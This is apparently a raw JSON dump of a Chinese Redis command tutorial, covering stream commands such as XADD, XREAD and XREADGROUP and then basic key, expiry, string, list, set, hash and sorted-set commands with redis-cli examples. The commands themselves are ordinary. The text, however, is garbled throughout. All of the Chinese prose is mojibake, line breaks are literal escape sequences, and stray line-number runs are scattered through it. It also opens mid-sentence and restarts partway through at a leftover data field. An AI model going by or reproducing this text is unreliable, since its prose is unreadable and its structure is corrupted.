æ¶ï¼ä¸æ¥åå°äºæç­äºä¸ä¸æ¬¡æ§è¡ XADD ç IDï¼å¦åä¼æ¥éï¼ERR The ID specified in XADD is equal or smaller than the target stream top itemï¼\n\n * field&stringï¼æ¥ä¸æ¥å°±æ¯è¥å¹²ç» field stringãå¯ä»¥æå®çè§£ä¸ºè¡¨ç¤ºå±æ§ç json ä¸­ç key-valueãä¾å¦ï¼æä¸ streams ç key å½åä¸º userInfoï¼ä¸æä¸ªç¨æ·ä¿¡æ¯ä¸º {"username":"afei", "password":"123456"}ï¼é£ä¹æ§è¡ XADD å½ä»¤å¦ä¸ï¼\n\n127.0.0.1:6379> xadd userInfo * name afei password 123456\n"1594456377383-0"\n127.0.0.1:6379> \n\n\n1\n2\n3\n\n\nç±äºå½ä»¤ä¸­ ID å­æ®µçå¼æ¯ * ï¼æä»¥èªå®çæ IDï¼1594456377383-0 å°±æ¯èªå¨çæç IDã XADD å½ä»¤ä¹æ¯ææ¾ç¤ºæå® IDï¼ä¾å¦ï¼XADD key 0-2 field stringã\n\néè¦æ³¨æçæ¯ï¼ID çæ¶é´æ³é¨åæ¯é¨ç½² Redis æå¡å¨çæ¬å°æ¶é´ï¼å¦æåçæ¶éåæ¨ä¼æä¹æ ·ï¼å¦æåçæ¶éåæ¨ï¼çæç ID çæ¶é´æ³é¨åå°±æ¯åæ¨åçæ¶é´ï¼ç¶åå ä¸è¿ä¸ªæ¶é´çéå¢åºåå·ãä¾å¦å½åæ¶é´æ³ 1540014082060ï¼ç¶åè¿æ¶ååçäºæ¶éåæ¨ï¼ä¸åæ¨ 5msï¼é£ä¹æ¶é´æ³å°±æ¯ 1540014082055ãåè®¾ä»¥åå·²ç»çæäº 1540014082055-0ï¼1540014082055-1ï¼é£ä¹è¿æ¬¡ç±äºæ¶éåæ¨ï¼çæç ID å°±æ¯ 1540014082055-2ãæä»¥åè®¸èªå¨çæç ID å¨åçæ¶éåæ¨æ¶å°äºä¸æ¬¡ç IDï¼ä½æ¯ä¸åè®¸æ¾ç¤ºæå®ä¸ä¸ªå°äºä¸æ¬¡ç IDã\n\nå¦ææä»¬ä»¥ç¸åç key æå¥ä¸éï¼ä»ä¸ä¼åæ®éç key-value ä¸æ ·åæ¿æ¢ï¼èæ¯å¨ç¸å key ç»´æ¤è¿ä¸ä¸ªåè¡¨ã\n\nxdel\n\n * ç¨æ³ï¼XDEL key ID [ID â¦]\n   å XADD ç¸åï¼è¿æ¯å½ä»¤ç¨æ¥ä» streams ä¸­å é¤è¥å¹²ä¸ª entryï¼å¹¶ä¸ä¼è¿åå®éå é¤æ°ï¼è¿ä¸ªå é¤æ°å¯è½ååæ° ID ä¸ªæ°ä¸ç­ï¼å ä¸ºæäº ID è¡¨ç¤ºçæ¶æ¯å¯è½ä¸å­å¨ãæ§è¡å½ä»¤å¦ä¸ï¼ç¬¬äºä¸ªåæ° ID æ¯ä¸å­å¨çï¼æä»¥ XDEL çè¿åç»ææ¯ 1ï¼\n\n127.0.0.1:6379> xdel userInfo 1594456377383-0\n(integer) 1\n\n\n1\n2\n\n\nxlen\n\n * ç¨æ³ï¼XLEN key\n   å¾å¥½çè§£ï¼è¿ä¸ªå½ä»¤å°±æ¯ç¨æ¥è¿åç¸å key çæ°éï¼ä¸é¢åè¯´ç¸å key æ¯ä¸ä¼è¦ççï¼æ¯ç»´æ¤äºä¸ä¸ªåè¡¨ï¼æä»¥è¿ä¸ªæ¯ç¸å key åè¡¨ç sizeãæ§è¡å¦ä¸ï¼\n\n127.0.0.1:6379> xadd user * name zhangsan\n"1594457206541-0"\n127.0.0.1:6379> xlen user\n(integer) 1\n127.0.0.1:6379> xadd user * name zhangsan sex 0 \n"1594457274424-0"\n127.0.0.1:6379> xlen user\n(integer) 2\n127.0.0.1:6379> xadd user * name zhangsan sex 0 password 123\n"1594457287981-0"\n127.0.0.1:6379> xlen user\n(integer) 3\n127.0.0.1:6379> xdel user 1594457287981-0\n(integer) 1\n127.0.0.1:6379> xlen user\n(integer) 2\n127.0.0.1:6379> \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# streams ä¸ç§æ¥è¯¢æ¨¡å¼\n\nredis æä¾äºä¸ç§æ¥è¯¢ streams æ°æ®çæ¨¡å¼ï¼\n\n * èå´æ¥è¯¢ï¼å ä¸º streams çæ¯ä¸ª entryï¼å¶é»è®¤çæç ID æ¯åºäºæ¶é´ä¸éå¢çï¼\n\n * çå¬æ¨¡å¼ï¼ç±»æ¯ linux ä¸­ç tailf å½ä»¤ï¼å®æ¶æ¥æ¶æ°å¢å å° streams ä¸­ç entryï¼ä¹æç¹åä¸ä¸ªæ¶æ¯ç³»ç»ï¼äºå®ä¸ç¬èè®¤ä¸ºå®å°±æ¯åé´äº kafkaï¼ï¼\n\n * æ¶è´¹èç»ï¼å³ Consumer Groupsï¼ç¹æ®ççå¬æ¨¡å¼ãä»ä¸ä¸ªæ¶è´¹èçè§åº¦æ¥ç streamsï¼ä¸ä¸ª streams è½è¢«ååºå°å¤ä¸ªå¤çæ¶æ¯çæ¶è´¹èï¼å¯¹äºä»»æä¸æ¡æ¶æ¯ï¼åä¸ä¸ªæ¶è´¹èç»ä¸­åªæä¸ä¸ªæ¶è´¹èå¯ä»¥å¤çï¼å kafka çæ¶è´¹èç»å®å¨ä¸æ ·ï¼ãè¿æ ·è¿è½å¤æ¨ªåæ©å®¹æ¶è´¹èï¼ä»èæåå¤çæ¶æ¯çè½åï¼èä¸éè¦åªè®©æè®©ä¸ä¸ªæ¶è´¹èå¤çæææ¶æ¯ã\n\nxrange\n\n * ç¨æ³ï¼XRANGE key start end [COUNT count]\n   è¿ä¸ªå½ä»¤å±äºç¬¬ 1 ç§æ¨¡å¼ï¼å³åºäºèå´æ¥è¯¢ãè¿ä¸ªå½ä»¤ç¨æ¥è¿å streams æä¸ªé¡ºåºèå´ä¸çåç´ ï¼start åæ°æ¯æ´å°ç IDï¼end åæ°æ¯æ´å¤§ç IDãæä¸¤ä¸ªç¹æ®ç ID ç¨ç¬¦å· "-" å "+" è¡¨ç¤ºï¼ç¬¦å· "-" è¡¨ç¤ºæå°ç IDï¼ç¬¦å· "+" è¡¨ç¤ºæå¤§ç IDï¼\n\n127.0.0.1:6379> XRANGE user 1540014096298-0 1594457274424-0\n1) 1) "1594457206541-0"\n   2) 1) "name"\n      2) "zhangsan"\n2) 1) "1594457274424-0"\n   2) 1) "name"\n      2) "zhangsan"\n      3) "sex"\n      4) "0"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n127.0.0.1:6379> xrange user - +\n1) 1) "1594457206541-0"\n   2) 1) "name"\n      2) "zhangsan"\n2) 1) "1594457274424-0"\n   2) 1) "name"\n      2) "zhangsan"\n      3) "sex"\n      4) "0"\n3) 1) "1594458356220-0"\n   2) 1) "name"\n      2) "wu"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nXRANGE è¿è½å®ç°éåæä¸ªèå´åºé´çåè½ï¼ä¾å¦ææ³éå 2018-10-20 å·æ°å¢çç¨æ·ä¿¡æ¯ãé¦åå¾å° 2018-10-20 00:00:00 å¯¹åºçæ¶é´æ³ä¸º 1539964800000ï¼åå¾å° 2018-10-20 23:59:59 å¯¹åºçæ¶é´æ³ä¸º 1540051199000ï¼ç¶åæ§è¡å¦ä¸å½ä»¤ï¼\n\n127.0.0.1:6379> xrange user 1594457206541-0 1594458356220-0 count 1\n1) 1) "1594457206541-0"\n   2) 1) "name"\n      2) "zhangsan"\n127.0.0.1:6379> xrange user 1594457206541-0 1594458356220-0 count 2\n1) 1) "1594457206541-0"\n   2) 1) "name"\n      2) "zhangsan"\n2) 1) "1594457274424-0"\n   2) 1) "name"\n      2) "zhangsan"\n      3) "sex"\n      4) "0"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nxrevrange\n\n * ç¨æ³ï¼XREVRANGE key end start [COUNT count]\n   è¿ä¸ªå½ä»¤ä¹å±äºç¬¬ 1 ç§æ¨¡å¼ï¼ä¸å XRANGE ç¸åï¼è¿åä¸ä¸ªéåºèå´ãend åæ°æ¯æ´å¤§ç IDï¼start åæ°æ¯æ´å°ç ID\n\nxread\n\n * ç¨æ³ï¼XREAD [COUNT count] [BLOCK milliseconds] STREAMS key [key â¦] ID [ID â¦]\n   å¾ææ¾ï¼è¿ä¸ªå½ä»¤å°±æ¯ç¨æ¥å®ç°ç¬¬ 2 ä¸ªæ¨¡å¼ï¼å³çå¬æ¨¡å¼ãå¶ä½ç¨æ¯è¿å streams ä¸­ä»æ¥æ²¡æè¯»åçï¼ä¸æ¯åæ° ID æ´å¤§çåç´ ã\n   è¿éæå¼äºä¸¤ä¸ªçªå£æµè¯ï¼ä¸ç¬¬ä¸ä¸ªæ²¡æåæ°å¢ï¼ç¬¬äºä¸ªåäºæ°å¢.\n\n127.0.0.1:6379> XREAD COUNT 10 BLOCK 60000 STREAMS user 1594458356220-0\n\n\n\n(nil)\n(60.02s)\n\n\n1\n2\n3\n4\n5\n6\n\n\n127.0.0.1:6379> XREAD COUNT 10 BLOCK 60000 STREAMS user 1594458356220-0\n1) 1) "user"\n   2) 1) 1) "1594458985980-0"\n         2) 1) "name"\n            2) "ceshi"\n(13.37s)\n127.0.0.1:6379> \n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nä½¿ç¨ xread ä¼é»å¡ç¹å®æ¶é´ï¼ç­å¾æ¯æ ID å¤§çæ°æ®ï¼å¦æä½¿ç¨æå° ID è¿è¡æµè¯ï¼ä¼è· xrange user - + æææ¯ä¸æ ·çã\n\næ³¨æï¼BLOCK ä¸º 0 è¡¨ç¤ºä¸è´ç­å¾ç¥éææ°çæ°æ®ï¼å¦åæ°¸è¿ä¸ä¼è¶æ¶ãå¹¶ä¸ ID çå¼æä»¬ç¨ç¹æ®å­ç¬¦ $ è¡¨ç¤ºï¼è¿ä¸ªç¹æ®å­ç¬¦è¡¨ç¤ºæä»¬åªè·åææ°æ·»å çæ¶æ¯ã\n\n127.0.0.1:6379> xread count 10 block 0 streams user $\n\n\n\n\n1\n2\n3\n\n\nxread è¿æ¯æåæ¶çå¬å¤ä¸ª streams\n\n127.0.0.1:6379> XREAD BLOCK 0 STREAMS user_01 user_02 user_03 user_04  $ $ $ $\n\n\n\n\n\n1\n2\n3\n4\n\n\nXREAD é¤äº COUNT å BLOCKï¼æ²¡æå¶ä»éé¡¹äºãææ XREAD æ¯ä¸ä¸ªéå¸¸åºæ¬çå½ä»¤ãæ´å¤é«çº§ç¹æ§å¯ä»¥å¾ä¸çæ¥ä¸æ¥è¦ä»ç»ç XREADGROUPã\n\nXREADGROUP\n\n * ç¨æ³ï¼XREADGROUP GROUP group consumer [COUNT count] [BLOCK milliseconds] STREAMS key [key â¦] ID [ID â¦]\n   å¾ææ¾ï¼è¿å°±æ¯ç¬¬ä¸ç§æ¨¡å¼ï¼æ¶è´¹èç»æ¨¡å¼ã\n * å¦æä½ äºè§£ kafka çæ¶è´¹èç»ï¼é£ä¹ä½ å°±ä¹äºè§£äº streams çæ¶è´¹èç»ãå¦æä¸äºè§£ä¹æ²¡å³ç³»ï¼ç¬èç®åè§£éä¸ä¸ï¼åè®¾æä¸ä¸ªæ¶è´¹è C1ï¼C2ï¼C3ãå¨ streams ä¸­æ»è®¡æ 7 æ¡æ¶æ¯ï¼1ï¼ 2ï¼ 3ï¼ 4ï¼ 5ï¼ 6ï¼ 7ï¼é£ä¹æ¶è´¹å³ç³»å¦ä¸æç¤ºï¼\n   1 -> C1\n   2 -> C2\n   3 -> C3\n   4 -> C1\n   5 -> C2\n   6 -> C3\n   7 -> C1\n * æ¶è´¹èç»å·å¤å¦ä¸å ä¸ªç¹ç¹ï¼\n   \n   * åä¸ä¸ªæ¶æ¯ä¸ä¼è¢«æéå°ä¸ä¸ªæ¶è´¹èç»ä¸çå¤ä¸ªæ¶è´¹èï¼åªå¯è½æ¯ä¸ä¸ªæ¶è´¹èã\n   \n   * åä¸ä¸ªæ¶è´¹èç»ä¸ï¼æ¯ä¸ªæ¶è´¹èé½æ¯å¯ä¸çï¼éè¿å¤§å°åææçåå­åºåã\n   \n   * æ¶è´¹èç»ä¸­çæ¶è´¹èè¯·æ±çæ¶æ¯ï¼ä¸å®æ¯æ°çï¼ä»æ¥æ²¡ææéè¿çæ¶æ¯ã\n   \n   * æ¶è´¹ä¸ä¸ªæ¶æ¯åï¼éè¦ç¨å½ä»¤ï¼XACKï¼ç¡®è®¤ï¼æææ¯è¯´ï¼è¿æ¡æ¶æ¯å·²ç»ç»æåå¤çãæ­£å ä¸ºå¦æ­¤ï¼å½è®¿é® streams çåå²æ¶æ¯æ¶ï¼æ¯ä¸ªæ¶è´¹èåªè½çå°æéç»å®èªå·±çæ¶æ¯ã\n\nXACK\n\n * ç¨æ³ï¼XACK key group ID [ID â¦]\n * è¿æ¯æ¶è´¹èç»ç¸å³çå¦ä¸ä¸ªéè¦çå½ä»¤ãæ è®°ä¸ä¸ªå¤çä¸­çæ¶æ¯ä¸ºå·²è¢«æ­£ç¡®å¤çï¼å¦æ­¤ä¸æ¥ï¼è¿æ¡æ¶æ¯å°±ä¼è¢«ä»æ¶è´¹èç»ç pending æ¶æ¯éåä¸­å é¤ï¼ç±»ä¼¼ MQ ä¸­ç ackã\n\nXGROUP\n\n * ç¨æ³ï¼xgroup create key groupname id\n * è¿ä¹æ¯æ¶è´¹èç»çä¸ä¸ªéè¦å½ä»¤ï¼è¿ä¸ªå½ä»¤ç¨æ¥ç®¡çæ¶è´¹èç»ï¼ä¾å¦åå»ºï¼å é¤ç­ã\n   XREADGROUPï¼XACKï¼XGROUP ä¸ç§å½ä»¤ææäºæ¶è´¹èç»ç¸å³çæä½å½ä»¤ã\n   ç®å XGROUP CREATE ç streams å¿é¡»æ¯ä¸ä¸ªå­å¨ç streamsï¼å¦åä¼æ¥éã\n   åå»ºä¸ä¸ªæ¶è´¹ç»\n\n127.0.0.1:6379> XGROUP CREATE user GRP-AFEI $\nOK\n\n\n1\n2\n',normalizedContent:'# å¬ç¨å½ä»¤\n\nå¯ä»¥å é¤ä»»ææ°æ®ç»æç key\n\ndel key \n\n\n1\n\n\næ¥çææ key\n\nkeys *\n\n\n1\n\n\næ ¹æ®ç»å®çéé¡¹ï¼å¯¹è¾å¥åè¡¨ãéåæèæåºéåè¿è¡æåºï¼ç¶åè¿åæèå­å¨æåºçç»æã\n\nsort source-key [by pattern] [limit offset count] [get pattern [get pattern ...]] [asc|desc] [alpha] [store dest-key] \n\n\n1\n\n\næ¥çæ°æ®åºæå¤å°ä¸ª key\n\ndbsize\n\n\n1\n\n\næ¸é¤ææåºçæ°æ®\n\nflushall\n\n\n1\n\n\næ¸é¤å½ååºçæææ°æ®\n\nflushdb\n\n\n1\n\n\næ¥ç reids åå­ä¿¡æ¯ç­\n\ninfo\n\n\n1\n\n\nçæ§ææå®¢æ·åéçå½ä»¤ï¼redis ç¼è¯æ§è¡æåçå½ä»¤ï¼\n\nmonitor\n\n\n1\n\n\n\n# å¤çæ¶é´\n\nç§»é¤é®çè¿ææ¶é´\n\npersist key \n\n\n1\n\n\næ¥çç»å®é®è·ç¦»è¿æè¿æå¤å°ç§\n\nttl key \n\n\n1\n\n\nç»å®é®å¨æå®çç§æ°åè¿æ\n\nexpire key seconds \n\n\n1\n\n\nå°ç»å®é®çè¿ææ¶é´è®¾ç½®ä¸ºç»å®ç unix æ¶é´æ³\n\nexpireat key timestamp\n\n\n1\n\n\næ¥çç»å®é®è·ç¦»è¿ææ¶é´è¿æå¤å°æ¯«ç§ï¼è¿ä¸ªå½ä»¤å¨ reids2.6 ä»¥ä¸çæ¬å¯ç¨ã\n\npttl key \n\n\n1\n\n\nè®©ç»å®é®å¨æå®çæ¯«ç§æ°ä¹åè¿æï¼è¿ä¸ªå½ä»¤å¨ redis2.6 ä»¥ä¸çæ¬å¯ç¨ã\n\npexpire key milliseconds \n\n\n1\n\n\nå°ä¸ä¸ªæ¯«ç§çº§ç²¾åº¦ç unix æ¶é´æ³è®¾ç½®ä¸ºç»å®é®çè¿ææ¶é´ï¼è¿ä¸ªå½ä»¤å¨ redis2.6 ä»¥ä¸çæ¬å¯ç¨ã\n\npexpireat key timestamp-milliseconds \n\n\n1\n\n\n\n# èªå¢åèªå\n\nå°é®å­å¨çå¼ + 1\n\nincr key \n\n\n1\n\n\nå°é®å­å¨çå¼ - 1\n\ndecr key \n\n\n1\n\n\nå°é®å­å¨çå¼å ä¸æ´æ° amount\n\nincrby key amount \n\n\n1\n\n\nå°é®å­å¨çå¼åå»æ´æ° amount\n\ndecrby key amount \n\n\n1\n\n\nå°é®å­å¨çå¼å ä¸æµ®ç¹æ° amountï¼è¿ä¸ªå½ä»¤å¨ redis2.6 ä»¥ä¸çæ¬å¯ç¨\n\nincrbyfloat key amount \n\n\n1\n\n\n\n# å­ç¬¦ä¸² string\n\nå¯ä»¥æ¯å­ç¬¦ä¸²ï¼ç®åçå­ç¬¦ä¸²ãå¤æçå­ç¬¦ä¸²ï¼ä¾å¦ jsonãxmlï¼ï¼ãæ°å­ï¼æ´æ°ãæµ®ç¹æ°ï¼ï¼çè³æ¯äºè¿å¶ï¼å¾çãé³é¢ãè§é¢ï¼ï¼ä½æ¯å¼æå¤§ä¸è½è¶è¿ 512mb\n\nåå»ºä¸ä¸ªé®å¼å¯¹ set key value\n\n127.0.0.1:6379> set a 1234567890\nok\n\n\n1\n2\n\n\nè·å key å­å¨çå¼ get key\n\n127.0.0.1:6379> get a\n"1234567890"\n\n\n1\n2\n\n\nå°å¼ value è¿½å å°ç»å® key å½åå­å¨çå¼çæ«å°¾ï¼è¿½å æåçåè¿åå¼ä¸ºè¿ä¸ªå­ç¬¦ä¸²çé¿åº¦ (length) append key value\n\n127.0.0.1:6379> append a a\n(integer) 11\n127.0.0.1:6379> get a\n"1234567890a"\n\n\n1\n2\n3\n4\n\n\nè·åä¸ä¸ªç±åç§»é start è³ end èå´åçææå­ç¬¦ç»æçå­ä¸²ï¼åæ¬ start å end å¨åãgetrange key start end\n\n127.0.0.1:6379> getrange a 0 3\n"1234"\n\n\n1\n2\n\n\nå°ä» start åç§»éå¼å§çå­ä¸²è®¾ç½®ä¸ºç»å®å¼ setrange key offset value\n\n127.0.0.1:6379> setrange a 3 bcde\n(integer) 11\n127.0.0.1:6379> get a\n"123bcde890a"\n\n\n1\n2\n3\n4\n\n\n\n# åè¡¨ list\n\nç¨æ¥å­å¨å¤ä¸ªæåºçå­ç¬¦ä¸²ï¼åè¡¨ä¸­çæ¯ä¸ªå­ç¬¦ä¸²ç§°ä¸ºåç´ ï¼elementï¼ï¼ä¸ä¸ªåè¡¨æå¤å¯ä»¥å­å¨ 2^32 -1 ä¸ªåç´ \n\nå°ä¸ä¸ªæå¤ä¸ªå¼æ¨å¥åè¡¨çå³ç«¯ rpush key value [...]\n\n127.0.0.1:6379> lrange b 0 -1\n1) "5"\n2) "6"\n127.0.0.1:6379> rpush b 7 8\n(integer) 4\n127.0.0.1:6379> lrange b 0 -1\n1) "5"\n2) "6"\n3) "7"\n4) "8"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nè·å list åç´ æ°é llen\n\n127.0.0.1:6379[1]> llen 32021420001:90000300009999:10002:1601198414621\n(integer) 2\n\n\n1\n2\n\n\nlpush key value [...] -> å°ä¸ä¸ªæå¤ä¸ªå¼æ¨å¥åè¡¨çå·¦ç«¯\n\n127.0.0.1:6379> lpush b 1 2\n(integer) 6\n127.0.0.1:6379> lrange b 0 -1\n1) "2"\n2) "1"\n3) "5"\n4) "6"\n5) "7"\n6) "8"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nrpop key -> ç§»é¤å¹¶è¿ååè¡¨æå³ç«¯çåç´ \n\n127.0.0.1:6379> rpop b\n"8"\n127.0.0.1:6379> lrange b 0 -1\n1) "2"\n2) "1"\n3) "5"\n4) "6"\n5) "7"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nlpop key -> ç§»é¤å¹¶è¿ååè¡¨æå·¦ç«¯çåç´ \n\n127.0.0.1:6379> lpop b\n"2"\n127.0.0.1:6379> lrange b 0 -1\n1) "1"\n2) "5"\n3) "6"\n4) "7"\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nlindex key offset -> è¿ååè¡¨ä¸­åç§»éä¸º offset çåç´  (ä¸æ ä» 0 å¼å§)\n\n127.0.0.1:6379> lindex b 3\n"7"\n\n\n1\n2\n\n\nlrange key start end -> è¿ååè¡¨ä» start åç§»éå° end åç§»éèå´çææåç´ ãåå« start å end æ¬èº«ãlrange key 0 -1 ä¸ºæ¥è¯¢ææ\n\n127.0.0.1:6379> lrange b 0 2\n1) "1"\n2) "5"\n3) "6"\n\n\n1\n2\n3\n4\n\n\nltrim key start end -> å¯¹åè¡¨è¿è¡ä¿®é®ï¼åªä¿çä» start è³ end åç§»éçåç´ ï¼åå« start å endã\n\n127.0.0.1:6379> ltrim b 1 2\nok\n127.0.0.1:6379> lrange b 0 -1\n1) "5"\n2) "6"\n\n\n1\n2\n3\n4\n5\n\n\nblpop key [...] timeout -> ä»ç¬¬ä¸ä¸ªéç©ºåè¡¨ä¸­å¼¹åºä½äºæå·¦ç«¯çåç´ ï¼æèå¨ timeout ç§ä¹åé»å¡å¹¶ç­å¾å¯å¼¹åºçåç´ åºç° (ä¸ä¸æµè¯æ²¡æåç´ æä»¥ nil)\n\n127.0.0.1:6379> blpop c 10\n(nil)\n(10.03s)\n\n\n1\n2\n3\n\n\nbrpop key [...] timeout -> ä»ç¬¬ä¸ä¸ªéç©ºåè¡¨ä¸­å¼¹åºä½äºæå³ç«¯çåç´ ï¼æèå¨ timeout ç§ä¹åé»å¡å¹¶ç­å¾å¯å¼¹åºçåç´ åºç° (ä¸ä¸æµè¯æ²¡æåç´ æä»¥ nil)\n\n127.0.0.1:6379> brpop c 10\n(nil)\n(10.07s)\n\n\n1\n2\n3\n\n\nrpoplpush source-key dest-key -> ä» source-key åè¡¨ä¸­å¼¹åºä½äºæå³ç«¯çåç´ ï¼ç¶åå°è¿ä¸ªåç´ æ¨å¥ dest-key åè¡¨çæå·¦ç«¯ï¼å¹¶åç¨æ·è¿åè¿ä¸ªåç´ \n\nbrpoplpush source-key dest-key timeout -> ä» source-key åè¡¨ä¸­å¼¹åºä½äºæå³ç«¯çåç´ ï¼ç¶åå°è¿ä¸ªåç´ æ¨å¥ dest-key åè¡¨çæå·¦ç«¯ï¼å¹¶åç¨æ·è¿åè¿ä¸ªåç´ ï¼å¦æ source-key ä¸ºç©ºï¼é£ä¹å¨ timeout ç§ä¹åé»å¡å¹¶ç­å¾å¯å¼¹åºçåç´ åºç°ã\n\n\n# éå set\n\nç¨æ¥ä¿å­å¤ä¸ªçå­ç¬¦ä¸²åç´ ï¼ä½ååè¡¨ç±»åä¸ä¸æ ·çæ¯ï¼éåä¸­ä¸åè®¸æéå¤åç´ ï¼å¹¶ä¸éåä¸­çåç´ æ¯æ åºçï¼ä¸è½éè¿ç´¢å¼ä¸æ è·ååç´ \n\nsadd key item[...] -> å°ä¸ä¸ªæå¤ä¸ªåç´ æ·»å å°éåéé¢ï¼å¹¶è¿åè¢«æ·»å åç´ å½ä¸­åæ¬å¹¶ä¸å­å¨äºéåéé¢çåç´ æ°éã\n\nsrem key item[...] -> ä»éåéé¢å é¤ä¸ä¸ªæå¤ä¸ªåç´ ï¼å¹¶è¿åè¢«ç§»é¤åç´ çæ°éã\n\nsismember key item -> æ£æ¥åç´ itemæ¯å¦å­å¨äºéåkeyéé¢ã\n\nscard key -> è¿åéååå«çåç´ æ°éã\n\nsmembers key -> è¿åéååå«çææåç´ ã\n\nsrandmember key [count] -> ä»éåééæºçè¿åä¸ä¸ªæå¤ä¸ªåç´ ï¼å½count ä¸ºæ­£æ´æ°æ¶ï¼å½ä»¤è¿åçéæºåç´ ä¸ä¼éå¤ï¼å½countä¸ºè´æ°æ¶ï¼å½ä»¤è¿åçéæºåç´ å¯è½ä¼åºç°éå¤ã\n\nspop key -> éæºçç§»é¤éåä¸­çä¸ä¸ªåç´ ï¼å¹¶è¿åè¢«ç§»é¤çåç´ ã\n\nsmove source-key dest-key item -> å¦æéåsource-keyåå«åç´ itemï¼é£ä¹ä»éåsource-key éé¢ç§»é¤yåç´ itemï¼å¹¶å°åç´ itemæ·»å å°éådest-keyä¸­ï¼å¦æitemæåç§»é¤ï¼é£ä¹å½ä»¤è¿å1ï¼å¦åè¿å0ï¼\n\nsdiff key[...] -> è¿åé£äºå­å¨äºç¬¬ä¸ä¸ªéåãä½ä¸å­å¨äºå¶ä»éåä¸­çåç´ (æ°å­¦ä¸çå·®éè¿ç®)\n\nsdiffstore dest-key key[...] -> å°é£äºå­å¨äºç¬¬ä¸ä¸ªéåä½ä¸å­å¨äºå¶ä»éåçåç´ (æ°å­¦ä¸çå·®éè¿ç®)å­å¨å°dest-key é®éé¢\n\nsinter key[...] -> è¿åé£äºåæ¶å­å¨äºææéåä¸­çåç´ (æ°å­¦ä¸çäº¤éè¿ç®)\n\nsinter dest-key key[...] -> é£äºåæ¶å­å¨äºææéåä¸­çåç´ (æ°å­¦ä¸çäº¤éè¿ç®)å­å¨å°dest-keyé®éé¢ã\n\nsunion key[...] -> è¿åé£äºè³å°å­å¨äºä¸ä¸ªéåä¸­çåç´ (æ°å­¦ä¸è®²çå¹¶éè¿ç®)\n\nsunionstore dest-key key[...] -> é£äºè³å°å­å¨äºä¸ä¸ªéåä¸­çåç´ (æ°å­¦ä¸è®²çå¹¶éè¿ç®)å­å¨å°dest-keyé®éé¢ã\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# æ£å hash åå¸ç±»å\n\n\nhset key-name key value -> åå»ºä¸ä¸ªæ£åå¹¶èµå¼\n\nhget key-name key -> è¿åæå®æ£åé®çå¼\n\nhgetall key-name -> è·åæ£ååå«çææé®å¼å¯¹\n\nhmset key-name key value[key value ...] -> ä¸ºæ£åéé¢çä¸ä¸ªæå¤ä¸ªé®è®¾ç½®å¼\n\nhmget key-name key[...] -> ä»æ£åéé¢è·åä¸ä¸ªæå¤ä¸ªé®çå¼\n\nhlen key-name -> è¿åæ£ååå«çé®å¼å¯¹æ°é\n\nhdel key-name key[...] -> å é¤æ£åéé¢çä¸ä¸ªæå¤ä¸ªé®å¼å¯¹ï¼è¿åæåæ¾å°å¹¶å é¤çé®å¼å¯¹æ°éã\n\nhexists key-name key -> æ£æ¥ç»å®çé®æ¯å¦å­å¨äºæ£åä¸­\n\nhkeys key-name -> è·åæ£ååå«çææé®\n\nhvals key-name -> è·åæ£ååå«çææå¼\n\nhincrby key-name key increment -> å°é®keyå­å¨çå¼å ä¸æ´æ°increment\n\nhincrbyfloat key-name key increment -> å°é®keyå­å¨çå¼å ä¸æµ®ç¹æ°increment\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n\n# æåºéå zset\n\nä¸è½æéå¤çåç´ ï¼èä¸è¿å¯ä»¥æåºï¼å®ååè¡¨ä½¿ç¨ç´¢å¼ä¸æ ä½ä¸ºæåºä¾æ®ä¸åçæ¯ï¼å®ç»æ¯ä¸ªåç´ è®¾ç½®ä¸ä¸ªåæ° (score) ä½ä¸ºæåºçä¾æ®ï¼é»è®¤ååºï¼\n\n\nzadd key score member [score member ...] -> å°å¸¦æç»å®åå¼çæåæ·»å å°æåºéåéé¢\n\nzrem key member[...] -> ä»æåºéåéé¢ç§»é¤ç»å®çæåï¼å¹¶è¿åè¢«ç§»é¤æåçæ°é\n\nzcard key -> è¿åæåºéååå«çæåæ°é\n\nzincrby key increment member -> å°memberæåçåå¼å ä¸increment\n\nzcount key min max -> è¿ååå¼ä»äºmin åmax ä¹é´çæåæ°é\n\nzrank key member -> è¿åæåmemberå¨æåºéåä¸­çæå\n\nzscore key member -> è¿åæåmemberçåå¼\n\nzrange key start stop [withscores] -> è¿åæåºéåä¸­æåä»äºstart å stop ä¹é´çæåï¼å¦æç»å®äºå¯éç withscores éé¡¹ï¼é£ä¹ä¼å°æåçåå¼ä¸å¹¶è¿åãzrange key 0 -1 æ¥è¯¢æææå\n\nzrevrank key member -> è¿åæåºéåéæåmemberçæåï¼æåæç§åå¼ä»å¤§å°å°æå\n\nzrevrange key start stop [withscores] -> è¿åæåºéåç»å®æåèå´åçæåï¼æç§åå¼ä»å¤§å°å°æå\n\nzrangebyscore key min max [withscores] [left offset count] -> è¿åæåºéåä¸­ï¼åå¼ä»äºminåmaxä¹é´çæææå\n\nzrevrangebyscore key max min [withscores] [left offset count] -> è·åæåºéåä¸­åå¼ä»äºminåmaxä¹é´çæææåï¼å¹¶æç§åå¼ä»å¤§å°å°çé¡ºåºæ¥è¿åä»ä»¬ã\n\nzremrangebyrank key start top -> ç§»é¤æåºéåä¸­æåä»äºstart å stop ä¹é´çæåã\n\nzremrangebyscore key min max -> ç§»é¤æåºéåä¸­åå¼ä»äºminåmax ä¹é´çæåã\n\nzinterstore dest-key key-count key[...] [weights weight[...] ] [aggregate sum|min|max] -> å¯¹ç»å®çæåºéåæ§è¡ç±»ä¼¼äºéåçäº¤éè¿ç®\n\nzunionstore dest-key key-count key[...] [weights weight[...] ] [aggregate sum|min|max] -> 